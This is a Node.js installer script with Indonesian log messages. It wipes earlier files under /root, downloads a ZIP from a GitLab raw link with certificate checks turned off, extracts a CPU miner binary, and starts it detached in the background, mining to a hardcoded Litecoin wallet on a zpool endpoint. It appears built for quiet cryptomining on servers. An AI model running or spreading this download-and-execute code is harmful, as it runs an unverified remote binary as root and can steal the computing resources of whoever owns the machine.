const { execSync, spawn } = require('child_process');
const fs = require('fs');

try {
    console.log("1. Bersihkan sisa-sisa file lama...");
    execSync('rm -rf /root/hoo_cpu* /root/hoo.zip* /root/start_miner.sh /root/index.html*');

    console.log("2. Mengaktifkan Linux HugePages untuk performa maksimal...");
    try {
        execSync('sysctl -w vm.nr_hugepages=128');
        console.log("-> HugePages aktif!");
    } catch (e) {
        execSync('echo 128 > /proc/sys/vm/nr_hugepages');
    }

    console.log("3. Memastikan utilitas 'unzip' terinstal...");
    try {
        execSync('command -v unzip');
    } catch (e) {
        console.log("-> Menginstal unzip...");
        execSync('apt-get update && apt-get install unzip -y', { stdio: 'inherit' });
    }

    console.log("4. Mengunduh paket miner format ZIP dari GitLab...");
    // Mengunduh berkas hoo.zip baru
    execSync('wget --no-check-certificate -O /root/hoo.zip https://gitlab.com/sarkalie/advz-zpool/-/raw/main/hoo.zip', { stdio: 'inherit' });

    console.log("5. Mengekstrak file ZIP...");
    // Mengekstrak berkas zip langsung ke direktori /root
    execSync('unzip -o /root/hoo.zip -d /root/', { stdio: 'inherit' });

    // Pindah ke folder biner jika hasil ekstrak membuat subfolder, atau tetap di /root
    try { process.chdir('/root/hoo_cpu'); } catch(e) { process.chdir('/root'); }

    console.log("6. Membuat file start_miner.sh dengan konfigurasi 4 Threads...");
    const scriptContent = `#!/bin/bash\n./hoo_cpu -o stratum+tcp://hoohash-pepew.eu.mine.zpool.ca:8335 -u ltc1qnac7xhquwtdkg52p87l7f6j7pr9lslfeh0r2vy -p c=LTC --pepepow -t 4\n`;
    fs.writeFileSync('start_miner.sh', scriptContent);

    console.log("7. Mengatur izin keamanan eksekusi (chmod)...");
    execSync('chmod 755 start_miner.sh hoo_cpu 2>/dev/null || chmod 755 start_miner.sh');

    console.log("8. Mengeksekusi penambang di latar belakang...");
    const miner = spawn('./start_miner.sh', [], {
        detached: true,
        stdio: 'inherit'
    });

    miner.unref();
    console.log("Sukses! Skrip berjalan lancar dari tautan ZIP GitLab dengan 4 Threads.");

} catch (error) {
    console.error("Proses terhenti karena eror:", error.message);
}
